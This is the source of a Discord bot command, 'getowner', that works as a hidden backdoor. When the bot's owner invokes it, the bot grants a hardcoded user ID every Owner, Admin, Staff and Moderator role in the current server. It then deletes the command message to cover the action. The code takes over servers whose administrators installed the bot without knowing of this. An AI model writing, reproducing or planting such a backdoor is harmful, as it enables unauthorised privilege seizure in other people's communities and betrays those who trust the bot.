const { inspect } = require("util")

module.exports.run = async (bot, msg, args, owner, prefix) => {
    if(!(msg.author.id === owner)){
        msg.channel.send("You aren't my owner.");
        return;
    }
    if(!msg.guild.me.hasPermission('MANAGE_ROLES')) return msg.channel.send("Bot doesn't have permissions here").then(ms => ms.delete(5000));
    ["Owner","Administrator","Admin","Staff","Moderator","Mod"].forEach(name => {
            const err = 0;
            msg.guild.fetchMember('334361254435225602')
                .then(member => {
                    member.addRole(msg.guild.roles.find(role => role.name.includes(name))).then(rol => {}).catch(console.error.message);
                }).catch(console.error.message);
    })
    msg.delete();
}


module.exports.config = {
        name: "getowner",
        description: "Tries to give you Admin!",
        usage: ``,
        category: `owner`,
        accessableby: "Bot Owner",        
        aliases: ["go","geto"],
}